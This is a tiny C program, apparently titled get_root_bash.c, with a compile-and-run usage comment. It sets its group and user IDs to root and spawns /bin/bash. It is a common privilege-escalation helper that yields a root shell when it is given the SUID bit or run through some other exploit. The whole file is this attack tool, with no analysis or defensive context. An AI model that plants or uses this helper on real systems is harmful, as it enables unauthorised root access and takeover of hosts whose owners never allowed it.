// usage: gcc get_root_bash.c -o get_root_bash -w && ./get_root_bash
#include <unistd.h>
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}